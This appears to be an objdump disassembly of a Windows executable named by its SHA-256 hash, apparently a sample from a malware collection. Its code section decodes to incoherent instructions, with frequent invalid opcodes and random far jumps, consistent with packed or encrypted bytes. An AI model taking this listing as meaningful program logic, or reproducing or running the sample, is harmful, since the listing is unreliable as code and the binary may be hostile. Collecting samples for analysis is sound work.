
5a012df7a0a23541322428a330efae2001beb938b846de977d9cfb158e76c291.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	lods   eax,DWORD PTR es:[esi]
  411002:	sbb    al,0xf4
  411004:	inc    esp
  411005:	stc    
  411006:	test   BYTE PTR [edx],ah
  411008:	fst    DWORD PTR [edi-0x59c1e14e]
  41100e:	aad    0x42
  411010:	retf   
  411011:	stc    
  411012:	mov    esi,0xc5eb782d
  411017:	jecxz  0x410fc0
  411019:	or     eax,0x20c95d1
  41101e:	sub    al,0xc
  411020:	retf   
  411021:	xor    al,0x3a
  411023:	imul   edx,DWORD PTR [ecx-0x69],0x5c579886
  41102a:	(bad)  
  41102b:	popf   
  41102c:	push   0xffffffac
  41102e:	add    eax,0xe05c30fd
  411033:	retf   0xac2b
  411036:	xor    al,0x51
  411038:	je     0x411052
  41103a:	sbb    eax,0xf3c1a089
  41103f:	int    0xf3
  411041:	sbb    al,al
  411043:	sub    BYTE PTR [esi-0x24ca7b7b],dl
  411049:	sbb    BYTE PTR [ecx+0x29],cl
  41104c:	cmp    DWORD PTR [ebx+0x58c15cff],ebp
  411052:	mov    WORD PTR [ecx+0x56],fs
  411055:	ror    BYTE PTR [ebp-0x3bdd877d],0xd5
  41105c:	scas   eax,DWORD PTR es:[edi]
  41105d:	retf   
  41105e:	ret    0x53bc
  411061:	aas    
  411062:	test   eax,0xa3f6a7ef
  411067:	sub    DWORD PTR [esi+eiz*4+0x46],ebx
  41106b:	retf   
  41106c:	jmp    0x1305:0x7810c00e
  411073:	mov    al,ds:0x95f3c5ce
  411078:	(bad)  
  411079:	aaa    
  41107a:	and    DWORD PTR [eax+0x6b],edx
  41107d:	xor    BYTE PTR [ecx+0x29],cl
  411080:	add    bh,BYTE PTR [edx]
  411082:	or     al,BYTE PTR [edx]
  411084:	stc    
  411085:	loope  0x41100b
  411087:	daa    
  411088:	ja     0x411100
  41108a:	nop
  41108b:	jmp    0x13b0fdb1
  411090:	fstp   TBYTE PTR [eax]
  411092:	nop
  411093:	jmp    0x411113
  411095:	xchg   esp,eax
  411096:	push   0xed6d1518
  41109b:	nop
  41109c:	jo     0x4110c5
  41109e:	xchg   ebp,eax
  41109f:	push   ebx
  4110a0:	daa    
  4110a1:	stc    
  4110a2:	cwde   
  4110a3:	mov    ecx,0xfc18090e
  4110a8:	pop    ebp
  4110a9:	pop    edx
  4110aa:	push   0x22
  4110ac:	rcr    BYTE PTR [ebp+0x75e4f4ba],cl
  4110b2:	push   ebx
  4110b3:	xchg   esp,eax
  4110b4:	mov    bh,0xd
  4110b6:	cli    
  4110b7:	lea    edi,[eax-0x2c96171]
  4110bd:	mov    WORD PTR [ecx-0xb],gs
  4110c0:	add    DWORD PTR [eax-0x10],ecx
  4110c3:	mov    ah,0x64
  4110c5:	repnz sub al,0xc0
  4110c8:	xchg   ebx,eax
  4110c9:	xchg   edi,eax
  4110ca:	xlat   BYTE PTR ds:[ebx]
  4110cb:	sub    eax,0x9bea8f33
  4110d0:	pop    ds
  4110d1:	xchg   edi,eax
  4110d2:	xor    dh,dh
  4110d4:	add    ecx,DWORD PTR [ecx+0x12]
  4110d7:	arpl   WORD PTR [ecx-0x6],cx
  4110da:	mov    edi,0x1749ae1e
  4110df:	mov    eax,?
  4110e1:	ret    
  4110e2:	add    BYTE PTR [ebp+0x1b1b24f5],bh
  4110e8:	nop
  4110e9:	leave  
  4110ea:	div    BYTE PTR [esi]
  4110ec:	or     bl,BYTE PTR [eax+0x2bf8e861]
  4110f2:	aad    0x2c
  4110f4:	push   cs
  4110f5:	fcmove st,st(0)
  4110f7:	(bad)  
  4110f8:	jp     0x4110ad
  4110fa:	out    dx,al
  4110fb:	aaa    
  4110fc:	push   edx
  4110fd:	jecxz  0x411154
  4110ff:	adc    BYTE PTR [esi+0x18d07ee8],ch
  411105:	fsubr  DWORD PTR [edx-0x7f40d2e1]
  41110b:	in     al,dx
  41110c:	add    eax,0x671b6003
  411111:	and    dh,BYTE PTR ds:0x9fcebc7a
  411117:	or     esi,DWORD PTR [edi]
  411119:	inc    eax
  41111a:	ins    BYTE PTR es:[edi],dx
  41111b:	adc    eax,0xaa77a864
  411120:	mov    cl,BYTE PTR [edx+0x2c]
  411123:	sbb    al,0x1
  411125:	cmc    
  411126:	test   edi,edx
  411128:	xchg   ebx,eax
  411129:	out    dx,al
  41112a:	mov    dh,0x16
  41112c:	ficom  WORD PTR [edi+0x645cbf41]
  411132:	int    0x1a
  411134:	mov    al,0x52
  411136:	les    eax,FWORD PTR [eax]
  411138:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411139:	sub    al,0xf8
  41113b:	call   0x600:0xf4a2c595
  411142:	jno    0x4111ba
  411144:	adc    ebx,DWORD PTR ds:0x85c224b1
  41114a:	sti    
  41114b:	int    0x56
  41114d:	xor    al,0x6f
  41114f:	(bad)  
  411150:	pop    eax
  411151:	int3   
  411152:	clc    
  411153:	pop    ss
  411154:	mov    bl,0x61
  411156:	fstp   st(5)
  411158:	sbb    BYTE PTR [edx-0x17846e14],bh
  41115e:	repnz inc ebx
  411160:	fcmovb st,st(4)
  411162:	sub    al,0x19
  411164:	leave  
  411165:	iret   
  411166:	mov    esi,0xb542162e
  41116b:	or     ebx,edx
  41116d:	ror    DWORD PTR [ecx-0x75e12596],cl
  411173:	add    DWORD PTR [edx+0x3416cc98],edi
  411179:	jp     0x4111f5
  41117b:	sbb    bl,ch
  41117d:	push   ebx
  41117e:	aam    0x5
  411180:	mov    al,0x2d
  411182:	sar    eax,1
  411184:	aam    0xbb
  411186:	and    al,0xde
  411188:	push   0x821f96d2
  41118d:	xchg   ebp,eax
  41118e:	data16 jns 0x4111f0
  411191:	pop    eax
  411192:	mov    edi,0x6bc0ca04
  411197:	mov    WORD PTR [ecx+0x25984d8b],ds
  41119d:	pushf  
  41119e:	stos   BYTE PTR es:[edi],al
  41119f:	iret   
  4111a0:	dec    eax
  4111a1:	ins    DWORD PTR es:[edi],dx
  4111a2:	sub    DWORD PTR [edi-0x3876cbf4],esp
  4111a8:	push   di
  4111aa:	jle    0x4111bd
  4111ac:	call   0x67774eb2
  4111b1:	cmp    eax,0xc78feecd
  4111b6:	inc    BYTE PTR [esi]
  4111b8:	std    
  4111b9:	pop    ecx
  4111ba:	les    eax,FWORD PTR [ecx+0x1e]
  4111bd:	sbb    BYTE PTR [edi+eiz*1-0x76],bh
  4111c1:	call   0xc0267dc0
  4111c6:	jge    0x411242
  4111c8:	push   ebp
  4111c9:	push   ecx
  4111ca:	jg     0x4111cd
  4111cc:	sbb    cl,BYTE PTR ds:0x72ebee78
  4111d2:	xor    ah,BYTE PTR cs:[ecx]
  4111d5:	xchg   ecx,eax
  4111d6:	pop    ds
  4111d7:	pop    esp
  4111d8:	pop    esp
  4111d9:	adc    ebp,DWORD PTR [ecx-0x21]
  4111dc:	push   ebp
  4111dd:	add    eax,0xd6f9074e
  4111e2:	fwait
  4111e3:	xchg   esp,eax
  4111e4:	adc    BYTE PTR [eax+0x71972055],dh
  4111ea:	in     al,0x80
  4111ec:	gs fldz 
  4111ef:	inc    edi
  4111f0:	shl    ebx,cl
  4111f2:	xchg   DWORD PTR [ebp+0x4d2aee5a],ebx
  4111f8:	dec    ecx
  4111f9:	mov    al,BYTE PTR [eax-0x6f]
  4111fc:	mov    eax,ds:0x798ce9c3
  411201:	loope  0x4111e8
  411203:	(bad)  
  411204:	lods   al,BYTE PTR ds:[esi]
  411205:	(bad)  
  411206:	daa    
  411207:	clc    
  411208:	inc    dl
  41120a:	push   ss
  41120b:	lods   al,BYTE PTR ds:[esi]
  41120c:	fs out dx,eax
  41120e:	mov    eax,0x9576757f
  411213:	dec    ecx
  411214:	or     eax,0xdb17e32
  411219:	leave  
  41121a:	(bad)  
  41121b:	test   al,0x88
  41121d:	sbb    eax,0x2e061ea8
  411222:	xor    eax,0x14f4e902
  411227:	mov    eax,0xb5a8418
  41122c:	or     ch,al
  41122e:	and    eax,0x9275438e
  411233:	pop    edi
  411234:	lods   eax,DWORD PTR ds:[esi]
  411235:	add    bl,al
  411237:	fs mov edi,0x4dbe7272
  41123d:	sbb    BYTE PTR [ecx-0x78],dh
  411240:	sub    eax,0x1d1a4296
  411245:	fiadd  DWORD PTR [edi]
  411247:	adc    dl,ah
  411249:	stc    
  41124a:	add    eax,0x31573dd2
  41124f:	jo     0x4111da
  411251:	xchg   esi,eax
  411252:	lea    esi,[esi+0x35f106f2]
  411258:	cmp    BYTE PTR [ebp+esi*1-0x63df187a],bl
  41125f:	sub    DWORD PTR [eax+eax*4],eax
  411262:	pushf  
  411263:	imul   ecx,DWORD PTR [edx+0x6c1c0d16],0xe8d9d66e
  41126d:	leave  
  41126e:	mov    edi,DWORD PTR [esi+0x5b]
  411271:	pop    es
  411272:	fisub  DWORD PTR [ecx-0x47d067e7]
  411278:	mov    ebp,0x9f203ae8
  41127d:	popf   
  41127e:	mov    al,ds:0xd5612b27
  411283:	mov    ?,WORD PTR [edi]
  411285:	jbe    0x411247
  411287:	inc    ecx
  411288:	mov    ebp,0xdf8d4d35
  41128d:	mov    al,0x5d
  41128f:	jbe    0x4112bd
  411291:	add    BYTE PTR ds:0xa21f1d14,0x1c
  411298:	pop    ss
  411299:	dec    edx
  41129a:	stc    
  41129b:	xor    dh,BYTE PTR [eax-0x67]
  41129e:	jl     0x411242
  4112a0:	addr16 jle 0x411272
  4112a3:	aas    
  4112a4:	in     al,0xfb
  4112a6:	mov    ds:0x2d0fa3d2,al
  4112ab:	arpl   WORD PTR [edi],ax
  4112ad:	pop    edi
  4112ae:	or     dl,BYTE PTR [eax+0x7f]
  4112b1:	add    al,0xc7
  4112b3:	jns    0x4112df
  4112b5:	in     al,0xd6
  4112b7:	rcl    BYTE PTR ds:0xe985b708,1
  4112bd:	xchg   esp,eax
  4112be:	daa    
  4112bf:	add    BYTE PTR [esi],dh
  4112c1:	mov    bh,0xc5
  4112c3:	or     dl,BYTE PTR [edx+0x13]
  4112c6:	(bad)  
  4112c7:	jmp    DWORD PTR [ebx]
  4112c9:	ja     0x4112a2
  4112cb:	adc    bh,bl
  4112cd:	test   DWORD PTR [ebx+0x36],edi
  4112d0:	sub    BYTE PTR [edi+0x71c225d0],0x8b
  4112d7:	(bad)  
  4112d8:	cmc    
  4112d9:	out    dx,eax
  4112da:	or     BYTE PTR [edi],ah
  4112dc:	or     eax,0xed94a386
  4112e1:	xor    dl,ah
  4112e3:	rcl    DWORD PTR [ecx+0x22],0xbf
  4112e7:	sbb    eax,0x59007419
  4112ec:	jo     0x41129d
  4112ee:	cmp    al,BYTE PTR [ebx]
  4112f0:	sub    BYTE PTR [ebp+0x64590430],ch
  4112f6:	sub    dl,BYTE PTR [esi]
  4112f8:	cmc    
  4112f9:	push   ebx
  4112fa:	adc    bh,BYTE PTR [edx]
  4112fc:	mov    eax,0x6648a76a
  411301:	(bad)  
  411302:	or     DWORD PTR [ebx+esi*4-0x80],edi
  411306:	neg    DWORD PTR [esi+eiz*4+0x3d3ec074]
  41130d:	mov    ah,0x12
  41130f:	xchg   BYTE PTR [eax],ch
  411311:	push   ebx
  411312:	inc    esp
  411313:	loop   0x4112a8
  411315:	shl    DWORD PTR [ebx],1
  411317:	mov    al,BYTE PTR [edx]
  411319:	imul   ebx,esi,0xd151b2bf
  41131f:	in     eax,dx
  411320:	inc    ebx
  411321:	push   es
  411322:	mov    ebx,0x240d069e
  411327:	sbb    eax,0x6a5c2170
  41132c:	call   0xf322:0xe68ff1b8
  411333:	test   DWORD PTR [edx],ebp
  411335:	xlat   BYTE PTR ds:[ebx]
  411336:	dec    esi
  411337:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411338:	push   esi
  411339:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41133a:	int3   
  41133b:	leave  
  41133c:	push   ecx
  41133d:	pop    esp
  41133e:	retf   0xbed5
  411341:	mov    dh,0xda
  411343:	or     ah,0xc3
  411346:	and    BYTE PTR [ebp-0xb7b53b9],dh
  41134c:	ds enter 0x8375,0x54
  411351:	(bad)  [ebx+0x44]
  411354:	mov    bh,0xb3
  411356:	and    al,0xfa
  411358:	(bad)  
  411359:	sub    al,0xf0
  41135b:	out    dx,eax
  41135c:	cdq    
  41135d:	xor    eax,0x22f01f2d
  411362:	push   ss
  411363:	add    DWORD PTR [esi+0x39],edx
  411366:	imul   ecx,ebp,0xb1cfd2e7
  41136c:	int3   
  41136d:	dec    esi
  41136e:	dec    edi
  41136f:	pop    edx
  411370:	cmp    ch,BYTE PTR [edx-0x7f]
  411373:	dec    esp
  411374:	adc    eax,0x5b9018ab
  411379:	aas    
  41137a:	les    ebp,FWORD PTR [edi-0x50]
  41137d:	rol    DWORD PTR [edi+eax*1-0x6c],0x15
  411382:	push   0xffffff82
  411384:	jge    0x4113dd
  411386:	rcl    bl,cl
  411388:	fistp  WORD PTR [eax]
  41138a:	jbe    0x411409
  41138c:	mov    bl,0xab
  41138e:	lods   al,BYTE PTR ds:[esi]
  41138f:	push   DWORD PTR [esi+ebp*4]
  411392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411393:	fcom   QWORD PTR [edi+esi*8-0x1e]
  411397:	mov    al,0xb6
  411399:	scas   eax,DWORD PTR es:[edi]
  41139a:	nop
  41139b:	jae    0x411415
  41139d:	cmp    ah,dh
  41139f:	jp     0x4113d8
  4113a1:	out    dx,eax
  4113a2:	call   0xb34391e9
  4113a7:	pushaw 
  4113a9:	jb     0x41136e
  4113ab:	ja     0x41140f
  4113ad:	or     DWORD PTR ds:0x69889d20,ecx
  4113b3:	xchg   DWORD PTR [esi-0x29749854],esi
  4113b9:	repnz bound esi,QWORD PTR [ebp+0x7b]
  4113bd:	xor    al,0x68
  4113bf:	outs   dx,BYTE PTR ds:[esi]
  4113c0:	sub    BYTE PTR ds:[ebp-0x2a8fd66d],ch
  4113c7:	arpl   bx,ax
  4113c9:	bnd jmp 0xc8b581a5
  4113cf:	add    BYTE PTR [ebx+0x740f217],0xc4
  4113d6:	loope  0x41141b
  4113d8:	add    al,0x8d
  4113da:	stc    
  4113db:	aaa    
  4113dc:	inc    esi
  4113dd:	jmp    0x41140d
  4113df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4113e0:	inc    ecx
  4113e1:	fld    DWORD PTR [edx]
  4113e3:	push   ebx
  4113e4:	out    dx,eax
  4113e5:	mov    ds:0x6ed7ca76,al
  4113ea:	xchg   ebp,ebx
  4113ec:	mov    edx,0x4855e0e6
  4113f1:	cmc    
  4113f2:	test   BYTE PTR [eax+0x42bf0ae7],ch
  4113f8:	scas   eax,DWORD PTR es:[edi]
  4113f9:	xor    esp,esp
  4113fb:	cli    
  4113fc:	mov    ebx,0x34adcf2f
  411401:	mov    eax,ds:0xb05db6c8
  411406:	icebp  
  411407:	out    0xb2,al
  411409:	es enter 0x7936,0x68
  41140e:	pop    eax
  41140f:	inc    ebp
  411410:	or     ebp,DWORD PTR [eax+0x327b35f1]
  411416:	call   0x59b9fecf
  41141b:	imul   edi,DWORD PTR [edi+0x4e],0x319e8b85
  411422:	xchg   edx,eax
  411423:	fs jno 0x4113ea
  411426:	inc    esi
  411427:	cmp    BYTE PTR [ecx+edx*4+0x36],dh
  41142b:	dec    ebp
  41142c:	mov    ds:0x7edef001,eax
  411431:	xlat   BYTE PTR ds:[ebx]
  411432:	fcmovbe st,st(4)
  411434:	inc    esp
  411435:	mov    al,ds:0xa87c0fc4
  41143a:	hlt    
  41143b:	test   al,0x9f
  41143d:	inc    ebp
  41143e:	loope  0x41147f
  411440:	loopne 0x41143e
  411442:	popa   
  411443:	test   BYTE PTR [edi+eax*4-0xa],ch
  411447:	cmp    BYTE PTR [eax+0x36e11c87],bh
  41144d:	xchg   edi,eax
  41144e:	retf   
  41144f:	mov    BYTE PTR fs:[ebx+0x4aedd859],ch
  411456:	les    ebx,FWORD PTR es:[ebx+eiz*1]
  41145a:	xchg   ebp,eax
  41145b:	xchg   ebx,eax
  41145c:	add    BYTE PTR [esi-0x79],0x85
  411460:	cmp    al,0x40
  411462:	cmc    
  411463:	xchg   esi,eax
  411464:	jp     0x41146a
  411466:	(bad)  
  411467:	jge    0x411444
  411469:	and    BYTE PTR [ebp+0x2aad2bac],ch
  41146f:	inc    ecx
  411470:	sbb    eax,0x2fbc40bb
  411475:	pop    ebp
  411476:	push   es
  411477:	cli    
  411478:	jecxz  0x41144f
  41147a:	sub    BYTE PTR [ecx+0x11],0xbf
  41147e:	pop    ecx
  41147f:	enter  0x653f,0xf
  411483:	push   cs
  411484:	cmp    ah,BYTE PTR [edi+esi*2-0x57ccf69]
  41148b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41148c:	clc    
  41148d:	pop    ss
  41148e:	lods   al,BYTE PTR ds:[esi]
  41148f:	in     eax,dx
  411490:	push   0x71e76f0
  411495:	outs   dx,BYTE PTR ds:[esi]
  411496:	in     eax,0xc1
  411498:	loopne 0x411484
  41149a:	out    0xb8,eax
  41149c:	int3   
  41149d:	(bad)  
  41149f:	pop    esp
  4114a0:	dec    ecx
  4114a1:	xlat   BYTE PTR ds:[ebx]
  4114a2:	dec    ebp
  4114a3:	test   al,0x5b
  4114a5:	adc    al,0x18
  4114a7:	and    BYTE PTR [ebp*8+0x44f468ee],cl
  4114ae:	cmp    al,ch
  4114b0:	ret    0x9cb5
  4114b3:	and    edi,DWORD PTR ds:0x6eaaf95
  4114b9:	lods   eax,DWORD PTR ds:[esi]
  4114ba:	push   ebp
  4114bb:	push   ss
  4114bc:	popf   
  4114bd:	call   0xcbbc4b8e
  4114c2:	loop   0x4114e7
  4114c4:	sbb    al,0x42
  4114c6:	sub    edx,DWORD PTR [eax+0x35]
  4114c9:	push   0xe8e81fea
  4114ce:	pop    eax
  4114cf:	add    BYTE PTR [ebx+ecx*1-0x4],bl
  4114d3:	jb     0x411525
  4114d5:	sbb    ebx,edx
  4114d7:	ror    DWORD PTR [ebx+ebp*4+0x61],cl
  4114db:	xchg   edx,eax
  4114dc:	dec    ebp
  4114dd:	jg     0x41154f
  4114df:	jmp    0xf839aa13
  4114e4:	call   eax
  4114e6:	mov    ah,0x87
  4114e8:	xchg   esp,ecx
  4114ea:	cdq    
  4114eb:	enter  0xd627,0xdd
  4114ef:	(bad)  
  4114f0:	dec    ecx
  4114f1:	aas    
  4114f2:	xlat   BYTE PTR ds:[ebx]
  4114f3:	je     0x41151a
  4114f5:	pop    ebx
  4114f6:	mov    edi,es
  4114f8:	dec    ebx
  4114f9:	mov    dl,0x40
  4114fb:	inc    esp
  4114fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114fd:	xor    al,dl
  4114ff:	jecxz  0x4114b6
  411501:	or     bh,BYTE PTR [ebx]
  411503:	dec    ebx
  411504:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411505:	mov    bl,0x0
  411507:	sub    eax,0x88bc287f
  41150c:	xchg   DWORD PTR [ecx-0x7fd00846],esp
  411512:	imul   esi,DWORD PTR [edi+eax*1-0x48],0xffffffbb
  411517:	inc    ebp
  411518:	ins    DWORD PTR es:[edi],dx
  411519:	mov    ss,WORD PTR [edx]
  41151b:	xor    BYTE PTR [ebp-0x7a],cl
  41151e:	icebp  
  41151f:	repz push eax
  411521:	cmp    BYTE PTR [ebp+0x6d],0xc1
  411525:	adc    eax,0x8e873480
  41152a:	dec    esi
  41152b:	push   cs
  41152c:	push   esi
  41152d:	std    
  41152e:	pushf  
  41152f:	push   0xffffffc7
  411531:	or     BYTE PTR [ebx],ah
  411533:	sub    al,0x1d
  411535:	psrlq  mm4,QWORD PTR ds:0x90a04591
  41153c:	arpl   WORD PTR [ecx],cx
  41153e:	test   DWORD PTR [ebx],esi
  411540:	ja     0x4114d4
  411542:	aam    0xa3
  411544:	jmp    0x41154e
  411546:	imul   edx,DWORD PTR [esi+0x3bcb0766],0xaa8de366
  411550:	int3   
  411551:	adc    eax,0x43ee8c37
  411556:	inc    ecx
  411557:	fadd   QWORD PTR [ecx-0x270282e4]
  41155d:	pop    eax
  41155e:	dec    edx
  41155f:	fadd   QWORD PTR [edx+0x5e]
  411562:	mov    edx,?
  411564:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411565:	mov    ch,0xb4
  411567:	scas   al,BYTE PTR es:[edi]
  411568:	mov    ch,0x4f
  41156a:	test   eax,0x581e5177
  41156f:	xchg   esp,eax
  411570:	push   ecx
  411571:	or     ch,BYTE PTR [ebp+0x527d6a1f]
  411577:	js     0x4115c4
  411579:	mov    eax,ds:0xf2d7d808
  41157e:	fwait
  41157f:	sub    ebp,DWORD PTR [ebx+0x1a]
  411582:	inc    esp
  411583:	shr    BYTE PTR [edx-0x4ab4ef4],1
  411589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41158a:	push   cs
  41158b:	dec    ecx
  41158c:	mov    ah,0x2
  41158e:	mov    bh,0xbb
  411590:	pop    eax
  411591:	xchg   BYTE PTR [esi+0x35c7cd66],cl
  411597:	call   0x27441603
  41159c:	cs xchg edx,eax
  41159e:	test   al,0x92
  4115a0:	retf   0x863f
  4115a3:	pop    esp
  4115a4:	push   edx
  4115a5:	fst    QWORD PTR [ebx+0x1d]
  4115a8:	in     al,0xd
  4115aa:	jae    0x41158a
  4115ac:	sti    
  4115ad:	gs sbb al,0xb6
  4115b0:	mov    eax,DWORD PTR [edx+0x3]
  4115b3:	shl    BYTE PTR [ecx+0x6b],1
  4115b6:	out    dx,eax
  4115b7:	add    dl,BYTE PTR [ebx-0x5d7fc034]
  4115bd:	(bad)  
  4115be:	out    dx,eax
  4115bf:	daa    
  4115c0:	jbe    0x4115f5
  4115c2:	les    edi,FWORD PTR [ecx]
  4115c4:	jne    0x41155c
  4115c6:	sti    
  4115c7:	test   BYTE PTR [eax],dh
  4115c9:	stos   DWORD PTR es:[edi],eax
  4115ca:	xor    ecx,DWORD PTR [esi+0xb]
  4115cd:	sahf   
  4115ce:	loope  0x41161f
  4115d0:	ret    0x6e0d
  4115d3:	hlt    
  4115d4:	mov    ebx,0x73be46f6
  4115d9:	cdq    
  4115da:	hlt    
  4115db:	pop    esi
  4115dc:	push   eax
  4115dd:	inc    ebp
  4115de:	or     BYTE PTR [eax],bl
  4115e0:	cld    
  4115e1:	dec    edx
  4115e2:	cmp    cl,BYTE PTR [edi+0x101958a6]
  4115e8:	nop
  4115e9:	inc    edx
  4115ea:	(bad)  
  4115ec:	loop   0x4115eb
  4115ee:	mov    esi,0x4a195544
  4115f3:	loop   0x411594
  4115f5:	pop    ss
  4115f6:	push   ds
  4115f7:	xchg   DWORD PTR [ecx-0x7c],ebp
  4115fa:	cmp    bl,BYTE PTR [ecx+ecx*8]
  4115fd:	mov    ebx,0xd30e0f75
  411602:	add    DWORD PTR [edi],edi
  411604:	out    0xce,al
  411606:	rcl    DWORD PTR [edx],0x1a
  411609:	inc    eax
  41160a:	je     0x411647
  41160c:	ja     0x41161a
  41160e:	ss stos BYTE PTR es:[edi],al
  411610:	cli    
  411611:	and    eax,0xe9ad0b88
  411616:	sub    BYTE PTR [ecx+ebp*1],dl
  411619:	aad    0xc0
  41161b:	xor    edx,DWORD PTR [esi-0x1c0ce3bf]
  411621:	jmp    0x411612
  411623:	inc    esp
  411624:	out    dx,al
  411625:	pop    edx
  411626:	push   es
  411627:	push   esi
  411628:	daa    
  411629:	std    
  41162a:	dec    ebx
  41162b:	loope  0x411689
  41162d:	scas   eax,DWORD PTR es:[edi]
  41162e:	cmp    DWORD PTR [ebx-0x6],eax
  411631:	test   DWORD PTR [edx],edx
  411633:	inc    ecx
  411634:	stos   DWORD PTR es:[edi],eax
  411635:	push   esp
  411636:	adc    eax,0x2a78fc8e
  41163b:	stos   BYTE PTR es:[edi],al
  41163c:	dec    ebp
  41163d:	mov    ch,0xe4
  41163f:	arpl   WORD PTR [ebp+0x1d],sp
  411642:	fwait
  411643:	adc    eax,0x2a0b68ce
  411648:	or     edx,ebx
  41164a:	jb     0x411664
  41164c:	das    
  41164d:	jnp    0x4116b1
  41164f:	xor    edi,DWORD PTR [edi-0x32]
  411652:	hlt    
  411653:	es cmp eax,ebp
  411656:	mov    bl,0xa7
  411658:	jmp    0x9eb1:0xb5ca452c
  41165f:	dec    edx
  411660:	hlt    
  411661:	stos   DWORD PTR es:[edi],eax
  411662:	push   eax
  411663:	ss stos BYTE PTR es:[edi],al
  411665:	pop    edi
  411666:	cmp    ch,BYTE PTR [ecx-0x6492e218]
  41166c:	iret   
  41166d:	lds    ebp,FWORD PTR [ebx-0xf92386d]
  411673:	lock jb 0x4116c3
  411676:	push   0x5d98801d
  41167b:	or     BYTE PTR [eax-0x7ed63f0a],bh
  411681:	xor    BYTE PTR ds:0xcef9b6ad,al
  411687:	es scas al,BYTE PTR es:[edi]
  411689:	pop    eax
  41168a:	adc    bl,BYTE PTR [edx-0x68562020]
  411690:	sti    
  411691:	add    ch,BYTE PTR [esi]
  411693:	jp     0x4116e2
  411695:	sbb    ah,BYTE PTR [esi]
  411697:	xor    DWORD PTR [eax+0x2c57998b],esp
  41169d:	dec    ebx
  41169e:	push   esp
  41169f:	jg     0x41164b
  4116a1:	pop    esp
  4116a2:	or     eax,0x2da3d0fc
  4116a7:	sub    BYTE PTR ds:0x92003c83,0x4f
  4116ae:	cdq    
  4116af:	pop    esi
  4116b1:	enter  0x4d1,0x1f
  4116b5:	sbb    BYTE PTR [ebp+0x4d],al
  4116b8:	cs mov esi,0xd0e36a37
  4116be:	pop    esp
  4116bf:	rol    DWORD PTR [ebx+ecx*8-0x10f758bd],1
  4116c6:	dec    esi
  4116c7:	sti    
  4116c8:	(bad)  
  4116c9:	pop    esi
  4116ca:	ficom  WORD PTR [eax+0x307d969a]
  4116d0:	cmp    al,0xc9
  4116d2:	and    BYTE PTR [ecx],al
  4116d4:	fdivr  DWORD PTR [eax]
  4116d6:	mov    bh,0xff
  4116d8:	sub    edi,0x37
  4116db:	lidtd  [ecx-0x68]
  4116df:	mov    esp,0x760e2878
  4116e4:	push   ds
  4116e5:	aaa    
  4116e6:	lock daa 
  4116e8:	fild   WORD PTR [edi+0x49]
  4116eb:	jge    0x41174c
  4116ed:	and    cl,ch
  4116ef:	fdiv   QWORD PTR [edx+0x5586170f]
  4116f5:	xchg   ebx,eax
  4116f6:	gs inc ecx
  4116f8:	or     al,0xc2
  4116fa:	ins    DWORD PTR es:[edi],dx
  4116fb:	sub    eax,0xb5102186
  411700:	xchg   ebx,eax
  411701:	and    edx,DWORD PTR [edi]
  411703:	icebp  
  411704:	std    
  411705:	lea    esp,ds:0x870b1a3f
  41170b:	ja     0x411726
  41170d:	in     eax,dx
  41170e:	inc    edx
  41170f:	lods   al,BYTE PTR ds:[esi]
  411710:	retf   0x889
  411713:	xor    esp,DWORD PTR [esi+0x95cc299]
  411719:	sub    al,0x27
  41171b:	xlat   BYTE PTR ds:[ebx]
  41171c:	pop    esi
  41171d:	and    BYTE PTR [ecx+0x41dd17e7],bh
  411723:	(bad)  
  411724:	sub    eax,0xba5c65a0
  411729:	arpl   WORD PTR [ebx+0x6],sp
  41172c:	adc    DWORD PTR [edx+0x38],edi
  41172f:	push   edi
  411730:	shl    ebp,cl
  411732:	sti    
  411733:	jmp    0x411700
  411735:	adc    DWORD PTR [esp+esi*2+0x52],0x43
  41173a:	fst    QWORD PTR [eax-0x5d]
  41173d:	dec    ebx
  41173e:	js     0x4116f4
  411740:	and    dh,dl
  411742:	lahf   
  411743:	pop    es
  411744:	(bad)  
  411745:	xchg   ebx,eax
  411746:	cmp    ecx,DWORD PTR [ebx+0x141242ba]
  41174c:	push   edi
  41174d:	cmp    BYTE PTR [edi+0x6f],0xd0
  411751:	jns    0x411782
  411753:	sbb    edx,esp
  411755:	push   es
  411756:	popf   
  411757:	xchg   ecx,eax
  411758:	xor    ecx,ebx
  41175a:	ret    0x2803
  41175d:	ds aas 
  41175f:	sbb    esp,DWORD PTR [edx]
  411761:	in     eax,dx
  411762:	cmp    BYTE PTR [eax],dl
  411764:	je     0x41172a
  411766:	or     DWORD PTR ds:0xabbcbdf2,edx
  41176c:	xor    ah,BYTE PTR [esi+0x544f6f54]
  411772:	bound  edi,QWORD PTR [ebx]
  411774:	cmp    eax,DWORD PTR [eax-0x26f63927]
  41177a:	jb     0x411753
  41177c:	xlat   BYTE PTR ds:[ebx]
  41177d:	fsubr  QWORD PTR [edi+0x55b1c82c]
  411783:	pop    ecx
  411784:	outs   dx,DWORD PTR ds:[esi]
  411785:	das    
  411786:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411787:	adc    DWORD PTR [ecx-0x6bf98edc],esi
  41178d:	jbe    0x411761
  41178f:	inc    edi
  411790:	dec    esi
  411791:	pop    es
  411792:	add    al,BYTE PTR [edi]
  411794:	xchg   BYTE PTR [ebp-0x528b4086],al
  41179a:	int3   
  41179b:	xchg   esi,ebp
  41179d:	sub    bl,0xf0
  4117a0:	pop    ebx
  4117a1:	pop    edi
  4117a2:	popf   
  4117a3:	bound  edx,QWORD PTR ss:[ebx-0x5b]
  4117a7:	xchg   ebp,eax
  4117a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117a9:	and    BYTE PTR [ebx-0x4cc18e08],0x66
  4117b0:	aaa    
  4117b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117b2:	outs   dx,BYTE PTR ds:[esi]
  4117b3:	inc    eax
  4117b4:	cwde   
  4117b5:	clc    
  4117b6:	fsub   QWORD PTR [edi]
  4117b8:	lahf   
  4117b9:	sbb    ebx,DWORD PTR [ebp+ecx*1+0x4a]
